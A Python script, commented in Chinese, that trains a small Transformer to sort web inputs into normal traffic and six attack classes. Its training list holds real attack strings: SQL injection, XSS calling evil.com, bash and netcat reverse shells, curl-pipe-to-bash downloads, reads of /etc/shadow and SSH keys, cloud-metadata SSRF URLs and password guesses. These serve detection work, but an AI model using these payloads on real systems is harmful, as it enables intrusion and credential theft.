#!/usr/bin/env python3
"""
train_transformer.py — 小型 Transformer 对话+安全意图模型

功能:
  自训练一个轻量 Transformer，支持:
  1. 安全意图分类（7类，复用 TextCNN 的类别体系）
  2. 基础对话回复生成

  模型: 4层 Transformer, hidden=128, head=4
  参数量: ~150万
  训练数据: 合成对话+安全样本
  输出: transformer.pt
"""

import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import Dataset, DataLoader
import random, time, os, math

# ─── 超参数 ─────────────────────────────────────────────────
VOCAB_SIZE = 1500
EMBED_DIM = 128
NUM_HEADS = 4
NUM_LAYERS = 4
FFN_DIM = 256
MAX_SEQ_LEN = 48
NUM_CLASSES = 7
BATCH_SIZE = 32
EPOCHS = 15
LR = 3e-4
SEED = 42
random.seed(SEED); torch.manual_seed(SEED)

CLASS_NAMES = ["normal","sql_injection","xss","path_traversal",
               "command_injection","ssrf","brute_force"]

# ─── 词汇表 ────────────────────────────────────────────────
class Vocab:
    def __init__(self):
        self.t2i = {"<PAD>":0,"<UNK>":1,"<BOS>":2,"<EOS>":3}
        self.i2t = ["<PAD>","<UNK>","<BOS>","<EOS>"]
        self._build()
    def _build(self):
        words = set()
        # 安全相关词汇
        for w in "select union drop insert delete update or where from table information_schema script alert onload javascript document cookie img svg iframe body fetch steal union select password admin root login hydra exec cmd system popen bash sh curl wget nc ping sleep benchmark waitfor concat char benchmark".split():
            words.add(w)
        # 通用词汇
        for w in "hello hi how are you thank thanks please help me search find query get post put delete head options http https cookie session token auth api user login logout register page limit json xml html css file image product order profile dashboard settings about contact news download help article trending notification message weather today forecast sunny rainy cloudy good morning afternoon evening night nice meet welcome sign create account forgot password view cart checkout payment shipping address confirmation tracking customer service return policy terms privacy language preference dark light theme font dashboard overview recent activity performance usage statistics project task deadline team file upload image preview document calendar meeting email chat video audio cloud backup sync offline mode python javascript database system network machine deep learning neural network transformer attention gradient loss optimizer training accuracy model layer convolution pooling feature class label predict detect classify generate respond understand intent entity semantic vector space dimension matrix vector normalize encode decode project fuse route schedule dispatch process execute monitor alert threat block allow normal abnormal suspicious attack safe secure vulnerable exploit payload injection traversal brute force scanner scan detect respond analyze reason plan simulate reflect observe perceive sense act decide choose recommend suggest explain describe identify recognize recognize pattern structure sequence token position encoding embedding attention head feed forward layer norm dropout residual activation softmax relu gelu sigmoid tanh linear convolution kernel filter stride padding pooling global local context window memory short long term recurrent state hidden cell gate input output forget candidate attention multi head cross self encoder decoder generator discriminator embedding positional feed forward normalization layer residual connection backprop gradient descent optimizer learning rate batch epoch loss accuracy precision recall f1 score true false positive negative confusion matrix roc auc curve threshold confidence probability distribution likelihood entropy cross information mutual conditional independent bayes causal correlation regression classification clustering dimensionality reduction component analysis principal singular value decomposition eigen vector matrix factorization non negative latent dirichlet allocation topic model word embedding glove word2vec fast text byte pair encoding sentence piece subword tokenization vocabulary language model perplexity bleu rouge meteor cider spice beam search sampling temperature top nucleus repetition penalty length penalty coverage diversity novelty fluency coherence relevance factuality groundedness helpfulness harmlessness honesty".split():
            words.add(w)
        # 中文常见字
        for c in "你好世界今天天气怎么样帮我查询请问有什么可以帮您感谢功能介绍用户指南常见问题联系我们关于首页导航搜索结果商品列表订单详情个人中心系统设置消息通知数据导出报表生成权限管理安全检测攻击识别防护策略威胁分析漏洞扫描渗透测试应急响应风险评伊日志审计监控告警封禁拦截允许拒绝正常异常可疑恶意代码病毒木马后门勒索钓鱼社会工程零日漏洞缓冲区溢出远程代码执行凭证填充会话劫持不安全反序列化身份验证失效敏感数据泄露访问控制安全配置错误跨站请求伪造注入缺陷恶意软件检测入侵防火墙规则".split():
            words.add(c)
        # 数字和符号
        for i in range(10):
            self.t2i[str(i)] = len(self.i2t); self.i2t.append(str(i))
        for w in sorted(words):
            if w not in self.t2i:
                self.t2i[w] = len(self.i2t); self.i2t.append(w)
        # 特殊字符
        for c in "'\"<>=/\\-;|&`(){}[]#@$%^*+~.:,!?":
            if c not in self.t2i:
                self.t2i[c] = len(self.i2t); self.i2t.append(c)
        print(f"[词汇表] 大小: {len(self.t2i)}")
    def __len__(self): return len(self.t2i)
    def encode(self, text, max_len=MAX_SEQ_LEN):
        import re
        tokens = []
        cur = ""
        for ch in text:
            if '\u4e00' <= ch <= '\u9fff':
                if cur: tokens.extend(cur.lower().split()); cur=""
                tokens.append(ch)
            elif ch.isalnum():
                cur += ch
            else:
                if cur: tokens.extend(cur.lower().split()); cur=""
                if ch.strip(): tokens.append(ch)
        if cur: tokens.extend(cur.lower().split())
        ids = [self.t2i.get(t,1) for t in tokens][:max_len]
        ids = [2] + ids + [3]  # BOS + content + EOS
        while len(ids) < max_len: ids.append(0)
        return ids

# ─── 模型 ───────────────────────────────────────────────────
class SmallTransformer(nn.Module):
    """
    小型 Transformer — 分类+生成双头
    架构: Token Embedding + Positional Encoding + 4层 Encoder
    分类头: Mean Pool → Linear → 7类
    生成头: 最后一个 token → Linear → vocab_size
    """
    def __init__(self, vocab_size=VOCAB_SIZE, embed_dim=EMBED_DIM,
                 num_heads=NUM_HEADS, num_layers=NUM_LAYERS,
                 ffn_dim=FFN_DIM, max_seq_len=MAX_SEQ_LEN,
                 num_classes=NUM_CLASSES):
        super().__init__()
        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)
        self.pos_enc = PositionalEncoding(embed_dim, max_seq_len)
        encoder_layer = nn.TransformerEncoderLayer(
            d_model=embed_dim, nhead=num_heads, dim_feedforward=ffn_dim,
            dropout=0.1, batch_first=True, activation='gelu')
        self.transformer = nn.TransformerEncoder(encoder_layer, num_layers)
        # 分类头
        self.cls_head = nn.Sequential(
            nn.Linear(embed_dim, embed_dim//2), nn.GELU(),
            nn.Linear(embed_dim//2, num_classes))
        # 生成头
        self.gen_head = nn.Linear(embed_dim, vocab_size)
        # 特征提取（64维，供 MessageBus）
        self.feat_proj = nn.Linear(embed_dim, 64)

    def forward(self, x, mode="classify"):
        emb = self.pos_enc(self.embedding(x))
        enc = self.transformer(emb)
        if mode == "classify":
            pooled = enc.mean(dim=1)
            return self.cls_head(pooled)
        elif mode == "generate":
            return self.gen_head(enc)
        elif mode == "feature":
            pooled = enc.mean(dim=1)
            return self.feat_proj(pooled)

class PositionalEncoding(nn.Module):
    def __init__(self, d_model, max_len=512):
        super().__init__()
        pe = torch.zeros(max_len, d_model)
        pos = torch.arange(0, max_len, dtype=torch.float).unsqueeze(1)
        div = torch.exp(torch.arange(0, d_model, 2).float() * (-math.log(10000.0)/d_model))
        pe[:, 0::2] = torch.sin(pos*div)
        pe[:, 1::2] = torch.cos(pos*div)
        self.register_buffer('pe', pe.unsqueeze(0))
    def forward(self, x):
        return x + self.pe[:, :x.size(1)]

# ─── 数据集 ─────────────────────────────────────────────────
TRAIN_DATA = [
    # (text, label)
    ("你好", 0), ("hi", 0), ("hello world", 0), ("今天天气怎么样", 0),
    ("帮我查一下天气", 0), ("请帮我搜索产品", 0), ("查看我的订单", 0),
    ("修改个人设置", 0), ("常见问题解答", 0), ("联系我们", 0),
    ("关于我们", 0), ("用户指南", 0), ("功能介绍", 0), ("首页导航", 0),
    ("搜索商品列表", 0), ("个人中心仪表盘", 0), ("数据导出报表", 0),
    ("消息通知设置", 0), ("权限管理页面", 0), ("how are you", 0),
    ("thank you", 0), ("welcome", 0), ("good morning", 0),
    ("please help me", 0), ("search products", 0), ("view my orders", 0),
    ("dashboard overview", 0), ("recent activity", 0), ("user profile", 0),
    ("system settings", 0), ("notification message", 0), ("privacy policy", 0),
    ("terms of service", 0), ("customer service", 0), ("return policy", 0),
    # SQL注入
    ("1' OR '1'='1", 1), ("' OR 1=1 --", 1), ("1; DROP TABLE users --", 1),
    ("1' UNION SELECT * FROM users --", 1), ("admin' --", 1), ("' OR ''='", 1),
    ("1' AND 1=1 --", 1), ("1' UNION SELECT username, password FROM users --", 1),
    ("1'; EXEC xp_cmdshell('dir') --", 1), ("1' OR '1'='1' /*", 1),
    ("union select from information_schema", 1), ("or 1=1 sleep(5)", 1),
    ("benchmark waitfor delay", 1), ("concat char 0x", 1),
    ("' UNION SELECT NULL, version() --", 1), ("1' AND SLEEP(5) --", 1),
    ("drop table information_schema", 1), ("union all select null null null", 1),
    # XSS
    ("<script>alert('XSS')</script>", 2), ("<img src=x onerror=alert(1)>", 2),
    ("<svg onload=alert(1)>", 2), ("javascript:alert(1)", 2),
    ("<script>document.cookie</script>", 2), ("<body onload=alert(1)>", 2),
    ("<iframe src=javascript:alert(1)>", 2), ("<script>fetch('http://evil.com')</script>", 2),
    ("<details open ontoggle=alert(1)>", 2), ("<input onfocus=alert(1) autofocus>", 2),
    ("<script src=http://evil.com/xss.js></script>", 2), ("<style>@import 'http://evil.com'</style>", 2),
    # 路径遍历
    ("../../../etc/passwd", 3), ("../../../etc/shadow", 3), ("..\\..\\..\\windows\\system32", 3),
    ("..%2F..%2F..%2Fetc%2fpasswd", 3), ("/etc/passwd", 3), ("/etc/shadow", 3),
    ("C:\\windows\\win.ini", 3), ("../../../proc/self/environ", 3),
    ("....//....//....//etc/passwd", 3), ("..%c0%af..%c0%afetc%2fpasswd", 3),
    ("../../../root/.ssh/id_rsa", 3), ("/var/log/auth.log", 3),
    # 命令注入
    ("; cat /etc/passwd", 4), ("| whoami", 4), ("&& id", 4), ("; ls -la /", 4),
    ("| nc -e /bin/sh 10.0.0.1 4444", 4), ("$(curl http://evil.com/payload.sh | bash)", 4),
    ("`id`", 4), ("; wget http://evil.com/shell.sh", 4),
    ("; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 4), ("&& curl http://evil.com", 4),
    ("; echo hacked > /var/www/html/index.html", 4), ("| ping -c 4 10.0.0.1", 4),
    # SSRF
    ("http://169.254.169.254/latest/meta-data/", 5), ("http://localhost:6379/", 5),
    ("http://127.0.0.1:8080/admin", 5), ("file:///etc/passwd", 5),
    ("gopher://127.0.0.1:6379/_INFO", 5), ("dict://localhost:11211/stats", 5),
    ("http://[::1]/", 5), ("http://0.0.0.0:22/", 5),
    ("http://metadata.google.internal/computeMetadata/v1/", 5), ("http://internal-service.local/", 5),
    # 暴力破解
    ("POST /login user=admin&password=123456", 6), ("POST /login user=admin&password=password", 6),
    ("POST /login user=root&password=toor", 6), ("POST /login user=admin&password=admin123", 6),
    ("POST /login user=admin&password=letmein", 6), ("POST /login user=admin&password=welcome", 6),
    ("POST /login user=admin&password=monkey", 6), ("POST /login user=admin&password=dragon", 6),
    ("POST /login user=admin&password=qwerty", 6), ("POST /login user=admin&password=master", 6),
    ("POST /login user=admin&password=shadow", 6), ("POST /login user=admin&password=princess", 6),
]

class TransformerDataset(Dataset):
    def __init__(self, vocab, num_aug=200):
        self.vocab = vocab
        self.samples = []
        for text, label in TRAIN_DATA:
            self.samples.append((text, label))
            # 数据增强
            for _ in range(num_aug // len(TRAIN_DATA)):
                aug = self._augment(text)
                self.samples.append((aug, label))
        print(f"[数据集] {len(self.samples)} 条样本")
    def _augment(self, text):
        r = random.random()
        if r < 0.3 and len(text) > 5:
            pos = random.randint(1, len(text)-2)
            return text[:pos] + text[pos+1:]
        elif r < 0.6:
            return text.replace(" ","  ",1) if " " in text else text+" "
        else:
            return text
    def __len__(self): return len(self.samples)
    def __getitem__(self, idx):
        text, label = self.samples[idx]
        ids = self.vocab.encode(text)
        return torch.tensor(ids, dtype=torch.long), torch.tensor(label, dtype=torch.long)

# ─── 训练 ───────────────────────────────────────────────────
def train():
    print("="*60)
    print("  Small Transformer 训练 — 分类+生成")
    print("="*60)
    vocab = Vocab()
    dataset = TransformerDataset(vocab, num_aug=2000)
    n = len(dataset)
    train_n = int(0.85*n)
    train_ds, test_ds = torch.utils.data.random_split(dataset, [train_n, n-train_n])
    train_loader = DataLoader(train_ds, batch_size=BATCH_SIZE, shuffle=True)
    test_loader = DataLoader(test_ds, batch_size=BATCH_SIZE)

    model = SmallTransformer(vocab_size=len(vocab))
    params = sum(p.numel() for p in model.parameters())
    print(f"  参数量: {params:,} ({params*4/1024:.1f}KB)")

    optimizer = torch.optim.AdamW(model.parameters(), lr=LR, weight_decay=1e-4)
    scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=EPOCHS)
    criterion = nn.CrossEntropyLoss()

    print(f"  训练集: {train_n}, 测试集: {n-train_n}")
    print("  "+"-"*56)
    best_acc = 0; best_state = None

    for epoch in range(EPOCHS):
        model.train()
        total_loss=0; correct=0; total=0; t0=time.time()
        for bx, by in train_loader:
            optimizer.zero_grad()
            logits = model(bx, mode="classify")
            loss = criterion(logits, by)
            loss.backward()
            torch.nn.utils.clip_grad_norm_(model.parameters(), 1.0)
            optimizer.step()
            total_loss += loss.item()
            correct += (logits.argmax(1)==by).sum().item()
            total += by.size(0)
        scheduler.step()

        model.eval()
        test_correct=0; test_total=0
        with torch.no_grad():
            for bx, by in test_loader:
                logits = model(bx, mode="classify")
                test_correct += (logits.argmax(1)==by).sum().item()
                test_total += by.size(0)

        train_acc = correct/total
        test_acc = test_correct/max(test_total,1)
        if test_acc > best_acc:
            best_acc = test_acc
            best_state = {k:v.clone() for k,v in model.state_dict().items()}
        print(f"  Epoch {epoch+1:2d}/{EPOCHS} | Loss: {total_loss/len(train_loader):.4f} | "
              f"Train: {train_acc:.1%} | Test: {test_acc:.1%} | {time.time()-t0:.1f}s")

    print("  "+"-"*56)
    print(f"  最佳: {best_acc:.1%}")

    # 分类别
    model.load_state_dict(best_state); model.eval()
    class_correct=[0]*NUM_CLASSES; class_total=[0]*NUM_CLASSES
    with torch.no_grad():
        for bx, by in test_loader:
            pred = model(bx, mode="classify").argmax(1)
            for i in range(len(by)):
                class_total[by[i]]+=1
                if pred[i]==by[i]: class_correct[by[i]]+=1
    print("\n  分类别:")
    for i,name in enumerate(CLASS_NAMES):
        acc = class_correct[i]/max(class_total[i],1)
        print(f"    {name:20s} {acc:.1%} {'█'*int(acc*30)}")

    # 保存
    save_path = "/root/.codebuddy/artifact/star_os/models/transformer.pt"
    torch.save({
        "model_state": best_state,
        "model_config": {
            "vocab_size": len(vocab), "embed_dim": EMBED_DIM,
            "num_heads": NUM_HEADS, "num_layers": NUM_LAYERS,
            "ffn_dim": FFN_DIM, "max_seq_len": MAX_SEQ_LEN,
            "num_classes": NUM_CLASSES,
        },
        "vocab": vocab.t2i,
        "class_names": CLASS_NAMES,
        "accuracy": best_acc,
        "param_count": params,
    }, save_path)
    print(f"\n  已保存: {save_path} ({os.path.getsize(save_path)/1024:.1f}KB)")
    print("="*60)
    return best_acc

if __name__ == "__main__":
    train()
